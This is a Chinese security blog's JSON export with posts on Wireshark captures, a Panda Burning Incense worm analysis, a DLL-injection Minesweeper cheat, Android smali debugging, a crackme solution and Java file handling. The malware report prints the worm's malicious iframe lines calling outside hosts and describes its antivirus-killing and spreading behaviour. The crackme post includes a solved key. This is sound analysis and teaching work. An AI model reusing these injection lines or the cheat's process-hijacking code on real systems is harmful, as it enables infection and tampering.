{"meta":{"title":"梁言","subtitle":null,"description":null,"author":"yusakul","url":"http://yoursite.com"},"pages":[{"title":"categories","date":"2018-06-21T13:10:11.000Z","updated":"2018-06-21T13:10:51.701Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-06-21T13:09:20.000Z","updated":"2018-06-21T13:09:54.271Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Wireshark抓取数据包","slug":"20180728 - wireshark截取数据包","date":"2018-07-28T06:11:37.000Z","updated":"2018-07-30T01:11:52.293Z","comments":true,"path":"2018/07/28/20180728 - wireshark截取数据包/","link":"","permalink":"http://yoursite.com/2018/07/28/20180728 - wireshark截取数据包/","excerpt":"","text":"分析ICMP协议数据包实验原理 ping是用来测试网络连通性的命令，一旦发出ping命令，主机会发出连续的测试数据包到网络中，在通常的情况下，主机会收到回应数据包，ping采用的是ICMP协议。 实验步骤 在过滤条件中分别输入“icmp” 点击开始抓包,为了抓取使用ICMP的包，我们要设置过滤条件，点击“选项”。 这是可以看到抓包过滤按钮后面的文本框出现了ICMP字样，说明过滤条件设置成功：点击开始，发现现在抓取不到任何包： 打开命令行窗口，执行命令：ping www.baidu.com: 这时可以看到数据包抓取页面抓取到了8包，与命令行显示的已发送和已接受的包的数量是一致的： ICMP报文的格式为： 在这个试验中，可以发现，icmp的报文就只有两种，请求和应答： 请求： 应答： 这两个报文的type不一样，8代表请求，0代表应答；code都为0，表示为回显应答；标示符和序列号都是一样的，表示这两个报文是配对的 。 DHCP数据包分析使用DHCP获取IP地址： （1）打开命令窗口,启动Wireshark。 （2）输入“ipconfig /release”。这条命令会释放主机目前的IP地址，此时，主机IP地址会变为0.0.0.0 （3）然后输入“ipconfig /renew”命令。这条命令让主机获得一个网络配置，包括新的IP地址。 （4）等待，直到“ipconfig /renew”终止。然后再次输入“ipconfig /renew” 命令。 (5）当第二个命令“ipconfig /renew” 终止时，输入命令“ipconfig /release” 释放原来的已经分配的IP地址 （6）停止分组俘获。如下图： 分析 由截图可知，本机发起DHCP Discover包，用来寻找DHCP服务器，源ip是0.0.0.0，因为刚开始还不知道，目的地址是255.255.255.255的广播地址，广播到整个网段。 此字段表示DHCP客户端的报文类型： 这是UDP上的DHCP，本机发起的端口是68，目标端口是67。 Offer（提供） DHCP服务器收到客户端发的DHCP Discover之后，会在自己的地址池中拿出一个没有分配的地址以及配套的参数（如：掩码、DNS、网关、域名、租期……），然后以一个DHCP Offer包发送出去。 此时源IP是DHCP服务器的IP，目的IP是255.255.255.255的广播。这时候本机还无法获得IP，所以DHCP服务器只能用广播来回应。 Message type为2表明是回复包。 给客户端的IP地址：192.168.42.86，但是现在还没有确认。 中断地址（网关）：Relay agent IP address：0.0.0.0 此截图表明通过UDP传输，客户端端口号68，服务器是67。 DHCP服务器地址 ： Request（请求） 客户端收到这个DHCP Offer后，会再发出一个DHCP Request给服务器来申请这个Offer中包含的地址。这个时候，客户端还没有正式拿到地址，所以还需要向DHCP服务器申请。 此时客户端的源IP还是0.0.0.0，目的IP还是255.255.255.255。 将这些都广播出去，告诉其他DHCP服务器和分配给本机的服务器。 确认回复 被客户机选择的DHCP服务器在收到DHCPREQUEST广播后，会广播返回给客户机一个DHCPACK消息包，表明已经接受客户机的选择，并将这一IP地址的合法租用以及其他的配置信息都放入该广播包发给客户机。","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://yoursite.com/categories/网络协议/"}],"tags":[{"name":"WireShark抓包","slug":"WireShark抓包","permalink":"http://yoursite.com/tags/WireShark抓包/"}]},{"title":"熊猫烧香变种病毒分析","slug":"病毒分析报告-熊猫烧香 ","date":"2018-07-13T01:14:47.000Z","updated":"2018-07-25T03:05:27.953Z","comments":true,"path":"2018/07/13/病毒分析报告-熊猫烧香 /","link":"","permalink":"http://yoursite.com/2018/07/13/病毒分析报告-熊猫烧香 /","excerpt":"","text":"分析报告 样本名 2_dump_SCY.exe（熊猫烧香） 作者 yusakul 时间 2018-07-13 平台 Win7-32 1．样本概况1.1 样本信息 病毒名称 2_dump_SCY.exe 所属家族 熊猫烧香 样本名称 0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768 样本类型 MS-DOS executable 样本大小 98816 bytes MD5值 b8f8e75c9e77743a61bbea9ccbcffd5d SHA1值 188fc8fc580c0ea4bf8a8900a3d36471823c8923 CRC32 E63D45D3 SHA256 0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768 SSDeep 3072:apAja0pSLwYqK6hVZ7N4bdq4a53YKCOTpc:a2ja0pShqK65ZOq4QYK1m 1.2 病毒行为 设置注册表实现自启动 修改资源管理器（explorer）的文件夹的隐藏属性 将进程的内存属性修改为可执行或可写 想系统服务发送控制码 删除服务 对指定运行的进程感兴趣 1.2 测试环境及工具 工具 备注 VMware® Workstation 14 Pro 分析环境win7_x32 火绒剑 行为监控 IDA pro 7.0 静态分析 Ollydbg 动态分析 1.3 分析目标1.3.1 查看PE文件1. kernel32.dll文件导入函数可以看出导入的这些函数都是进程、文件相关的API函数。 2. Advapi32.dllAdvapi32.dll是一个高级API应用程序接口。包括了函数与对象的安全性，注册表的操控以及事件日志相关的API函数。 这些函数主要包括三类：注册表相关函数，进程权限修改函数，服务相关函数。 3. Mpr.dllMpr.dll是windows操作系统网络通信相关模块。 Wsock.dll windows socket相关API接口。 WNetAddConnection2A创建一个网络资源的链接。 URLDownloadToFileA从指定的URL读取内容写入到文件中。 由上述的导入表分析可知，该病毒程序的主要功能包括：文件读写、注册表修改、进程权限修改，网络链接，URL等。 1.3.2 火绒剑监控 - 文件操作1. 创建自我备份在根目录 2. 创建并释放隐藏文件Desktop_.ini 3. 自我复制 1.3.2火绒剑监控 - 注册表操作1. 无效“显示所有文件和文件夹”功能 2. 删除杀毒软件自启项 3. 修改文件 使用notepad++查看被修改的文件，被新添加了一行： 1&lt;iframe src=http://www.ac86.cn/66/index.htm width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt; 将该网址提交微步在线分析如下 1.3.3 火绒剑监控 - 网络操作1. 扫描并尝试连接局域网脑内139、445端口 因为本次分析是在虚拟机封闭分析，所以没有连接其他主机，猜测此病毒连接成功后，会向其他主机发送自己，达到传播目的。 2. 尝试连接外网IP，并发送数据包 数据内容如下： 1.3.4火绒剑监控 - 进程操作1. 遍历系统进程并启动自释放文件 2．具体行为分析2.1 主要行为2.1.1 恶意程序对用户造成的危害1. 替换程序图标 2. 隐藏文件 3. 有目录创建Desktop_.ini文件，内容为当前时间（2018-7-11）。 大量用户软件被修改，无法正常运行 2.2 恶意代码分析2.2.1 恶意代码树结构图 2.2.1 恶意代码IDA结构图两次对比字符串是否相等，不相等则退出, 验证完成后有三个主要的恶意行为函数 2.2.2 主要功能函数sub_40819C – 复制此函数主要功能为自我复制到系统目录并执行复制体。 1．查找系统目录下是否存在Desktop.ini文件,有则删除 2．检测病毒spc0lsv.exe病毒会通过检查文件路径、病毒感染标志来确定进当前病毒属于以下三种情况的哪一种情况。 分别进程本身属于原始病毒文件、被感染的可执行文件、以及伪装目标进程三种情况。 （1）原始病毒文件 拷贝自身到~/system32/driver/目录，重命名为spc0lsv.exe并运行，然后结束当前进程。 （2）当前程序时是被感染的可执行文件 1）在当前目录释放被感染的原始文件 2）删除系统目录下spo0lav 3）将创建病毒程序拷贝到系统目录，并执行。 （3）当前运行路径为系统根目录，说明当前是在伪装成系统程序状态下运行的，没有敏感操作。 2.2.3 主要功能函数sub_40D18C – 感染此函数为感染传播函数。 该函数由3个主要函数，第一个执行感染功能，第二个实现自我复制，第三个局域网传播自身。 感染文件线程（1）遍历文件夹，判断是否为文件夹，判断目录下是否存在Desktop_.ini文件。 判断是否存在Desktop_.ini （2）若目录下存在Desktop_.ini，获取当前系统时间，对比Desktop_.ini中的时间，是同一天则表示此目录已被感染，跳过此目录。 若不同则在此目录下生成新的Desktop_.ini，写入本地时间。 （3）删除GHO备份 （4）感染PE文件 – 感染方式1 将病毒内容直接覆盖到要感染程序，感染目标文件后缀类型有：EXE、SCR、PIF、COM。 f_HackWay1: （5）感染PE文件 – 感染方式2 网页感染：感染目标文件后缀类型有：htm, html, asp, php, jsp, aspx。 主要将字符串（\\&lt;iframe src=http://www.krvkr.com/worm.htm width=0height=0>\\&lt;/iframe>）添加到文件末尾。 f_HackWays: 2. 自我复制 - 时钟周期6s 检索各个磁盘的根目录是否存在setup.exe和autorun.inf文件，存在则删除它们。 将自身复制到 盘符:\\setup.exe 遍历磁盘, 创建“盘符:\\autorun.inf”文件。 设置setup.exe文件属性为 \\&lt;系统,隐藏> 设置autorun.inf文件属性为 \\&lt;系统，隐藏>，同时将setup.exe设置为自启 3. 局域网传播 2.2.4 主要功能函数sub_40D088 – 其他此函数主要功能为通过修改注册表实现自我保护，连接网站实现自我更新等功能。 该函数中设置了6个时钟周期，定时执行不同的功能。 TimerFunc_1（1s）（1）提升进程权限 （2）遍历窗口名, 向指定窗口名发送QUIT消息, 并结束指定进程，大多为杀毒防护软件。 （3）扫描进程，如果有检测到以下进程则结束它，下图为部分截图： （4）修改注册表，设置spo0lsv.exe开机启动，设置文件（夹）隐藏 TimerFunc_2（1200s）通过URL地址更新 TimerFunc_3（10s）（1）通过URL地址更新 （2）删除网络共享：net share ipc\\$ /del 删除ipc\\$共享 （3）关闭当前时钟 4. TimerFunc_4（6s）将杀毒软件服务停止，并删除注册表启动项。 TimerFunc_5（10s）字符串被加密操作过，根据特征猜测可能是网址，似乎是对一些网址做了操作。 TimerFunc_6（180s）仍然是从某个网址上下载文件，应该不是关键操作。 3．解决方案3.1 病毒行为病毒行为1：病毒本身创建了名为“spo01sv.exe”的进程，该进程文件的路径为“C:\\WINDOWS\\system32\\drivers\\spo01sv.exe”。 病毒行为2：在注册表KCU\\Software\\Microsoft\\Windows\\CurrentVersio n\\Run”中创建“svcshare”，用于在开机时启动位于“C:\\WINDOWS\\system3 2\\drivers\\spo0lsv.exe”的病毒程序。 病毒行为3：修改注册表，使得隐藏文件无法通过普通的设置进行显示，该位置为HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Adva nced\\Folder\\Hidden\\SHOWALL，病毒将CheckedValue的键值设置为了0。 病毒行为4：将自身拷贝到根目录，并命名为“setup.exe”，同时创建“autorun.inf”用于病毒的启动，这两个文件的属性都是“隐藏”。 病毒行为5：在一些目录中创建名为“Desktop_.ini”的隐藏文件。 3.2 杀毒工具编写步骤3.2.1 终止病毒进程1.利用ToolHelpAPI获得快照句柄,而后再利用Process32First和Process32Next枚举当前的进程,枚举的过程当中获取结构体ProcessEntry32这个结构体里面的相关信息(包括进程名和进程ID); 2.找到目标进程之后,利用OpenProcess获取当前的进程句柄,最后再利用TerminateProcess终止病毒进程. 3.2.2. 删除文件调用函数Bool DeleteFile (LPCTSTRlpFilename)，把lpFilename设为要指向删除的文件的文件名的指针即可,可以包含具体路径。 3.2.3 修复注册表，删除启动启动项RegOpenKeyEx()打开目标主键,并返回句柄,然后利用RegSetValueEx进行修改键值,最后可以利用RegSetValueEx来删除键值,最后利用RegCloseKey来进行关闭。 3.2.3 查杀工具链接我的GitHub·https://github.com/yusakul/PandaKiller 3.2.4 工具截图","categories":[],"tags":[{"name":"病毒","slug":"病毒","permalink":"http://yoursite.com/tags/病毒/"}]},{"title":"一键扫雷插件","slug":"扫雷插件分析与编写","date":"2018-07-13T01:14:47.000Z","updated":"2018-08-01T04:02:14.478Z","comments":true,"path":"2018/07/13/扫雷插件分析与编写/","link":"","permalink":"http://yoursite.com/2018/07/13/扫雷插件分析与编写/","excerpt":"","text":"扫雷游戏插件的目标 当鼠标放在扫雷的方格中时，会显示是否有雷。 一键扫雷，快捷键是F5 扫雷游戏的分析 需要的技能 ① 会编写DLL ②会写注入读取或者写内存的代码 ③能够分析出扫雷程序中的信息 需要分析的数据 ① 扫雷数组的大小 ② 扫雷数组的宽度 、高度 ③ 扫雷数组中的数量 需要分析的代码 ① 找到遍历扫雷数组的代码，或者分析出如何遍历数组 ② 找到屏幕坐标转换数组下的代码，或者分析出这个过程 ③ 找到数组下标转换屏幕坐的代码，或者分析出这个过程 代码框架 接管扫雷窗口的回调函数，处理F5的按键消息 修改窗口属性SetWindowLong 扫雷游戏-分析数据 ① 扫雷数组的大小 ② 扫雷数组的宽度 、高度 ③ 扫雷数组中的数量 根据宽度或者高的值变化，使用 CE 在内存中搜索数值，从而能找到宽度的地址 CE使用 修改程序数据的值，在CE中搜索 每次修改之后，再使用CE搜索，最后确定可能的值 注意：绿色的地址就是可以映射到文件偏移的地址，绿色地址称为基址 在可能的值上查找此地址数据的代码 再次修改数据，会有代码被记录 代码处：10036AC 高度：1005338 宽度：1005334 雷数：1005330 扫雷游戏-分析代码 从数值变化的代码处开始分析 从代码处： 10036 AC 开始跟踪分析 敏感 API 下断点，再进一步分析 下断点，再进一步分析 定时器创建和销毁： SetTimer，KillTimer 随机函数： rand 从窗口回调函数开始分析 窗口回调函数开始分析 ，分析鼠标按下消息 使用 spy++ 查找程序的窗口回调 地址：1001BC9 分析1-从数值变化的代码处开始分析从代码处：10036AC开始跟踪分析 修改完数据之后，应该初始化扫雷数组、随机生成雷。 随机生成雷的代码中，是一个循环随机生成雷的x,y 坐标，然后写入到对应缓冲区 基地址：0x1005340 X坐标计算：随机数+1 Y坐标计算：(随机数+1)*32 根据内存情况可以分析出一些标记： 0F ：初始化的值 8F ：雷的标记 4X ：周围有几颗雷就是4X, 41，42，43，44…… 10 ：边界 有了随机雷的生成，那么在雷生成前面的CALL，应该就是初始化雷区数组的代码，经过调试查看内存，发现真的是。 分析初始化雷区数组代码，发现为三步 初始化全部缓冲区为 0x0 F 初始化行标记 为 0x10 初始化列标记 位 0x 10 搭建代码框架第一步 ，定义一些值和函数 1234567891011121314151617WNDPROC g_OldProc = NULL;HWND g_hWnd = NULL;LRESULT WINAPI WindowProc (_In_ HWND hWnd,_In_ UINT Msg,_In_ WPARAM wParam,_In_ LPARAM lParam)&#123; if (Msg == WM_KEYDOWN &amp;&amp; wParam == VK_F5) &#123; CString strString; strString.Format(L\"wParam = %p\", wParam); OutputDebugString(strString.GetBuffer()); return DefWindowProc(hWnd, Msg, wParam, lParam); &#125; return CallWindowProc(g_OldProc, hWnd, Msg, wParam, lParam);&#125; 第二步，修改回调函数 1234567// 修改扫雷窗口的回调函数// 1. 找到扫雷窗口g_hWnd = FindWindow(NULL, L\"扫雷\");// 2. 修改窗口回调g_OldProc = (WNDPROC)SetWindowLong(g_hWnd, GWL_WNDPROC, (LONG)WindowProc);// 恢复窗口回调SetWindowLong(g_hWnd, GWL_WNDPROC, (LONG)g_OldProc); 注意：写代码要记得释放和恢复，写代码要做好debug的准备 经过调整编写之后，遍历扫雷的数组 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 基地址：0x1005340// 高度：1005338// 宽度：1005334// 雷数：1005330byte** g_MineArray = (byte**)0x1005340;int* g_nHeight = (int*)0x1005338;int* g_nWidth = (int*)0x1005334;int* g_nMineCount = (int*)0x1005330;LRESULT WINAPI WindowProc (_In_ HWND hWnd,_In_ UINT Msg,_In_ WPARAM wParam,_In_ LPARAM lParam)&#123; if (Msg == WM_KEYDOWN &amp;&amp; wParam == VK_F5) &#123; CString strString; strString.Format(L\"saolei wParam = %p\", wParam); OutputDebugString(strString.GetBuffer()); // 遍历扫雷数组 int nHeight = *g_nHeight; // 高度y int nWidth = *g_nWidth; // 宽度x int nCount = *g_nMineCount; int nCurrentCount = 0; for (int j = 1; j &lt; nHeight+1; j++) &#123; CString strString1; strString1.Format(L\"saolei 行：%d \", j); // 行遍历时，需要注意去掉边界 for (int i = 1; i &lt; nWidth + 2 - 1; i++) &#123; byte byCode = *(byte*)((int)g_MineArray+i+j*32); if (byCode == (byte)0x8F) &#123; nCurrentCount += 1; &#125; CString strCode; strCode.Format(L\" %02x \", byCode); strString1 += strCode; &#125; strString1 += L\"\\r\\n\"; OutputDebugString(strString1.GetBuffer()); &#125; CString strString2; strString2.Format(L\"saolei 雷数 = %d\", nCurrentCount); OutputDebugString(strString2.GetBuffer()); return DefWindowProc(hWnd, Msg, wParam, lParam); &#125; return CallWindowProc(g_OldProc, hWnd, Msg, wParam, lParam);&#125; 分析 -屏幕坐标转数组下标分析思路： ① 窗口回调下消息断点，分析鼠标按下弹起消息的流程 ② 静态分析窗口回调，使用IDA找到对应的消息处理流程 窗口回调地址：1001BC9 在地址处下消息断点WM_LBUTTONDOWN 在这个消息的lParam参数里是x,y坐标 将汇编代码翻译为C代码 123456789101112131415WORD y = HIWORD(lParam);y = (y - 0x27) &gt;&gt; 4;WORD x = LOWORD(lParam);x = (x + 4) &gt;&gt; 4;byte byCode = *(byte*)((int)g_MineArray + x + y * 32);if (byCode == (byte)0x8F)&#123; SetWindowText(hWnd,L\"扫雷 - 友情提示：你踩到雷了！\");&#125;else &#123; SetWindowText(hWnd, L\"扫雷\");&#125; 分析-数组下标转屏幕坐标将上面的代码反转 123456789// 发送一个鼠标按下弹起的消息WORD y = j;y = (y &lt;&lt; 4) + 0x27; //y 高16位WORD x = i;x = (x &lt;&lt; 4) - 4; // x 低16位SendMessage(hWnd, WM_LBUTTONDOWN, 0, MAKELPARAM(x,y));SendMessage(hWnd, WM_LBUTTONUP, 0, MAKELPARAM(x, y)); DLL调试 如果有源码，可以使用VS进行调试，只需要设置启动exe即可 如果没有源码，使用OD调试，一般选择在调试的代码处加入特征汇编指令 比如： Mov eax, eax Mov eax, eax 在注入 DLL 之后，可以搜索指令 之后，可以搜索指令 选择 DLL 模块 （在模块列表中找到对应，右键跟随入口） 选择 DLL 模块的代码基址 (进入模块代码之后，拖到最前面) 使用 Ctrl +S, 搜索 在OD中注入DLL","categories":[],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"http://yoursite.com/tags/逆向工程/"}]},{"title":"AndroidStudio附加动态调试smali","slug":"AndroidStudio动态调试smali","date":"2018-07-06T02:30:28.000Z","updated":"2018-07-25T07:03:45.092Z","comments":true,"path":"2018/07/06/AndroidStudio动态调试smali/","link":"","permalink":"http://yoursite.com/2018/07/06/AndroidStudio动态调试smali/","excerpt":"","text":"本文部分参考至吾爱破解https://www.52pojie.cn/thread-658865-1-1.html AndroidStudio动态调试smali配置操作稍微有些繁琐，为了加深印象，同时方便日后翻阅查询，所以有了这篇博客。 1、环境与工具 AndroidStudio V3.2beta1 smaliidea——AndroidStudio插件 链接：https://pan.baidu.com/s/1htl26qS 密码：0pre AndroidKiller V1.3.1.0 jdk1.8.0_171 2、安装smaliidea插件 3、AndroidKiller分析apk将目标apk文件拖入到AndroidKiller中分析，找到要调试APK的包名和入口的Activity 记住包名ctf.bobdylan 和入口的Activity名 ctf.bobbydylan.M 这里要注意一下 在application标签里面要有 android:debuggable=”true” 这句代码，没有是不能调试apk的 现在调试的这个例子默认是有这句代码的 有的apk中没有这句代码要自行添加上 然后找到该文件的工程目录，此目录将被AndroidStudio导入。 4、导入工程到AndroidStudio，以及AndroidStudio配置可以直接导入上面的工程目录，当时我们还是做个拷贝吧。 选择整个工程目录导入，然后一直保持默认配置点next即可，导入后切换到工程视图。 选择smali目录作为资源目录，见下图 配置远程调试的选项，选择Run–&gt;Edit Configurations 并增加一个Remote调试的调试选项，端口选择:8700 5、监听端口：打开模拟器与Monitor模拟器我这里选择的是AndroidStudio自带的，把自己要调试的APK安装到手机模拟器中。 打开命令行 输入命令 : adb shell am start -D -n ctf.bobdylan/ctf.bobbydylan.M 对apk进行动态调试 这条命令运行后手机屏幕将会进入到调试界面(如果手机屏幕没有进入到调试界面说明USB没有连接好手机 或者USB调试模式 没有打开 或者其他原因) ，手机将自动运行被调试App 因为新版AndroidStudio已经在菜单中移除了Monitor，我们需要手动在SDK文件夹中找到Monitor，同时Monitor不支持JDK8以上的版本，比如JDK10。如下为我的Monitor路径，请根据自己SDK安装情况查找。 E:\\Sdk\\tools\\lib\\monitor-x86_64\\monitor.exe 查看Android Device Monitor 记住下图中Online对应的值12863， 然后把Android Device Monitor关掉(这里一定要关掉,因为它会占用8700端口 导致后面转发端口失败) 6、附加进程打开命令行窗口 输入命令 adb forward tcp:8700 jdwp:12863 转发8700 端口 (这里 jdwp是自己Android Device Monitor中要调试app的Online值 ) 在Smali中下好断点 断点的意思是程序运行到下断点的那行代码就会断下来 ，我们找到入口类ctf.bobbydylan.M” 下好断点之后Run–&gt;Attach to Local Process附加进程，这里的smali是我们之前配置好的调试选项 此时手机会进入程序 在手机上输入用户名和密码 点登陆 程序会断在我下的断点处 单步调试为F8，运行为F9。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Android逆向分析","slug":"Android逆向分析","permalink":"http://yoursite.com/tags/Android逆向分析/"}]},{"title":"Android Crackme","slug":"Android Crackme","date":"2018-07-05T00:41:56.000Z","updated":"2018-07-05T02:05:11.290Z","comments":true,"path":"2018/07/05/Android Crackme/","link":"","permalink":"http://yoursite.com/2018/07/05/Android Crackme/","excerpt":"","text":"接触安卓逆向拿来练手的第一个小程序 分析程序链接: https://pan.baidu.com/s/18kWNe-IH26m5GpQnZOkiNw 密码: jy2m分析工具：Android Killer模拟器：夜神模拟器 安装后输入随机输入密码查看验证提示很显然，可以搜索字符串”错误”、”OK”来定位到关键代码。不过Android Killer提供了检索列出所有字符串的功能…，很方便的得到如下信息。双击进入，看到错误分支在异常处理中再上java源码~大致流程为获取输入字符串，传入check方法中，如不抛出异常，则验证成功。下面贴上check方法代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package ctf.bobbydylan;import android.content.Intent;import android.os.Bundle;import android.widget.Button;import android.widget.TextView;import ctf.bobdylan.R;public class M extends T &#123; public void check(String str) &#123; int i = 0; if (str.length() != 16) &#123; throw new RuntimeException(); &#125; String str2 = \"\"; try &#123; str2 = getKey(); &#125; catch (Exception e) &#123; str2 = getKey(); System.arraycopy(str2, 0, str, 5, 5); &#125; int[] iArr = new int[16]; iArr[0] = 0; iArr[12] = 14; iArr[10] = 7; iArr[14] = 15; iArr[15] = 42; try &#123; iArr[1] = 3; iArr[5] = 5; System.out.println(); &#125; catch (Exception e2) &#123; iArr[5] = 37; iArr[1] = 85; &#125; iArr[6] = 15; iArr[2] = 13; iArr[3] = 19; iArr[11] = 68; iArr[4] = 85; iArr[13] = 5; iArr[9] = 7; iArr[7] = 78; iArr[8] = 22; while (i &lt; str.length()) &#123; if ((iArr[i] &amp; 255) != ((str.charAt(i) ^ str2.charAt(i % str2.length())) &amp; 255)) &#123; throw new RuntimeException(); &#125; i++; &#125; &#125; public String getKey() &#123; return \"bobbydylan\"; &#125; public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.main); startService(new Intent(this, P.class)); ((Button) findViewById(R.id.button)).setOnClickListener(new a(this, (TextView) findViewById(R.id.et))); &#125; protected void onPause() &#123; stopService(new Intent(this, P.class)); super.onPause(); &#125;&#125; 这里有个坑，如下图，我们一开始搜索字符串的时候就能发现有两个相似字符串，其实他们是不同类中的方法获取得到的。但是check中调用的是T类中的getkey()，其返回的字符串为”bobdylan”。 逆向获取key： 1234567891011121314151617#include \"stdafx.h\"#include &lt;process.h&gt;int main()&#123; char nArray1[16] = &#123; 0, 3, 13, 19, 85, 5, 15, 78, 22, 7, 7, 68, 14, 5, 15, 42 &#125;; char nArray2[8] = &#123; 'b', 'o', 'b', 'd', 'y', 'l', 'a', 'n' &#125;; char nArray3[16] = &#123;0&#125;; for (int i = 0; i &lt; 16; i++) &#123; nArray3[i] = (nArray1[i] ^ nArray2[(i % 8) &amp;0xFF]); printf(\"%c\", nArray3[i]); &#125; printf(\"\\n\"); system(\"pause\"); return 0;&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Android逆向分析","slug":"Android逆向分析","permalink":"http://yoursite.com/tags/Android逆向分析/"}]},{"title":"java文件读写操作","slug":"java文件读写操作","date":"2018-07-03T12:23:17.000Z","updated":"2018-07-03T13:12:01.204Z","comments":true,"path":"2018/07/03/java文件读写操作/","link":"","permalink":"http://yoursite.com/2018/07/03/java文件读写操作/","excerpt":"","text":"一.获得控制台用户输入的信息123456789101112131415161718public String getInputMessage() throws IOException...&#123; System.out.println(\"请输入您的命令∶\"); byte buffer[]=new byte[1024]; int count=System.in.read(buffer); char[] ch=new char[count-2];//最后两位为结束符，删去不要 for(int i=0;i&lt;count-2;i++) ch[i]=(char)buffer[i]; String str=new String(ch); return str; ｝ 可以返回用户输入的信息，不足之处在于不支持中文输入，有待进一步改进。 二.复制文件 以文件流的方式复制文件 12345678910111213141516public void copyFile(String src,String dest) throws IOException...&#123; FileInputStream in=new FileInputStream(src); File file=new File(dest); if(!file.exists()) file.createNewFile(); FileOutputStream out=new FileOutputStream(file); int c; byte buffer[]=new byte[1024]; while((c=in.read(buffer))!=-1)...&#123; for(int i=0;i&lt;c;i++) out.write(buffer[i]); &#125; in.close(); out.close(); &#125; ​ 该方法经过测试，支持中文处理，并且可以复制多种类型，比如txt，xml，jpg，doc等多种格式 三.写文件 1.利用PrintStream写文件 12345678910public void PrintStreamDemo()...&#123; try ...&#123; FileOutputStream out=new FileOutputStream(\"D:/test.txt\"); PrintStream p=new PrintStream(out); for(int i=0;i&lt;10;i++) p.println(\"This is \"+i+\" line\"); &#125; catch (FileNotFoundException e) ...&#123; e.printStackTrace(); &#125; &#125; 2.利用StringBuffer写文件 123456789101112public void StringBufferDemo() throws IOException......&#123; File file=new File(\"/root/sms.log\"); if(!file.exists()) file.createNewFile(); FileOutputStream out=new FileOutputStream(file,true); for(int i=0;i&lt;10000;i++)......&#123; StringBuffer sb=new StringBuffer(); sb.append(\"这是第\"+i+\"行:前面介绍的各种方法都不关用,为什么总是奇怪的问题 \"); out.write(sb.toString().getBytes(\"utf-8\")); &#125; out.close(); &#125; ​ 该方法可以设定使用何种编码，有效解决中文问题。 四.文件重命名1234567891011public void renameFile(String path,String oldname,String newname)...&#123; if(!oldname.equals(newname))...&#123;//新的文件名和以前文件名不同时,才有必要进行重命名 File oldfile=new File(path+\"/\"+oldname); File newfile=new File(path+\"/\"+newname); if(newfile.exists())//若在该目录下已经有一个文件和新文件名相同，则不允许重命名 System.out.println(newname+\"已经存在！\"); else...&#123; oldfile.renameTo(newfile); &#125; &#125; &#125; 五.转移文件目录 转移文件目录不等同于复制文件，复制文件是复制后两个目录都存在该文件，而转移文件目录则是转移后，只有新目录中存在该文件。 123456789101112131415public void changeDirectory(String filename,String oldpath,String newpath,boolean cover)...&#123; if(!oldpath.equals(newpath))...&#123; File oldfile=new File(oldpath+\"/\"+filename); File newfile=new File(newpath+\"/\"+filename); if(newfile.exists())...&#123;//若在待转移目录下，已经存在待转移文件 if(cover)//覆盖 oldfile.renameTo(newfile); else System.out.println(\"在新目录下已经存在：\"+filename); &#125; else...&#123; oldfile.renameTo(newfile); &#125; &#125; &#125; 六.读文件 1.利用FileInputStream读取文件 12345678910111213public String FileInputStreamDemo(String path) throws IOException...&#123; File file=new File(path); if(!file.exists()||file.isDirectory()) throw new FileNotFoundException(); FileInputStream fis=new FileInputStream(file); byte[] buf = new byte[1024]; StringBuffer sb=new StringBuffer(); while((fis.read(buf))!=-1)...&#123; sb.append(new String(buf)); buf=new byte[1024];//重新生成，避免和上次读取的数据重复 &#125; return sb.toString(); &#125; 2.利用BufferedReader读取 在IO操作，利用BufferedReader和BufferedWriter效率会更高一点 1234567891011121314public String BufferedReaderDemo(String path) throws IOException...&#123; File file=new File(path); if(!file.exists()||file.isDirectory()) throw new FileNotFoundException(); BufferedReader br=new BufferedReader(new FileReader(file)); String temp=null; StringBuffer sb=new StringBuffer(); temp=br.readLine(); while(temp!=null)...&#123; sb.append(temp+\" \"); temp=br.readLine(); &#125; return sb.toString(); &#125; 3.利用dom4j读取xml文件 12345678public Document readXml(String path) throws DocumentException, IOException...&#123; File file=new File(path); BufferedReader bufferedreader = new BufferedReader(new FileReader(file)); SAXReader saxreader = new SAXReader(); Document document = (Document)saxreader.read(bufferedreader); bufferedreader.close(); return document; &#125; 七.创建文件(文件夹) 1.创建文件夹 12345public void createDir(String path)...&#123; File dir=new File(path); if(!dir.exists()) dir.mkdir(); &#125; 2.创建新文件 123456789public void createFile(String path,String filename) throws IOException...&#123; File file=new File(path+\"/\"+filename); if(!file.exists()) file.createNewFile();&#125; 八.删除文件(目录) 1.删除文件 12345public void delFile(String path,String filename)...&#123; File file=new File(path+\"/\"+filename); if(file.exists()&amp;&amp;file.isFile()) file.delete(); &#125; 2.删除目录 要利用File类的delete()方法删除目录时，必须保证该目录下没有文件或者子目录，否则删除失败，因此在实际应用中，我们要删除目录，必须利用递归删除该目录下的所有子目录和文件，然后再删除该目录。 123456789101112131415public void delDir(String path)...&#123; File dir=new File(path); if(dir.exists())...&#123; File[] tmp=dir.listFiles(); for(int i=0;i&lt;tmp.length;i++)...&#123; if(tmp[i].isDirectory())...&#123; delDir(path+\"/\"+tmp[i].getName()); &#125; else...&#123; tmp[i].delete(); &#125; &#125; dir.delete(); &#125; &#125;","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"不同语言编译的程序入口总结","slug":"各种语言编译的程序入口","date":"2018-06-30T06:23:29.000Z","updated":"2018-06-30T08:05:32.056Z","comments":true,"path":"2018/06/30/各种语言编译的程序入口/","link":"","permalink":"http://yoursite.com/2018/06/30/各种语言编译的程序入口/","excerpt":"","text":"BC++程序特征1. OEP特征 二进制特征:EB 10 66 62 3A 43 2B 2B 48 4F 4F 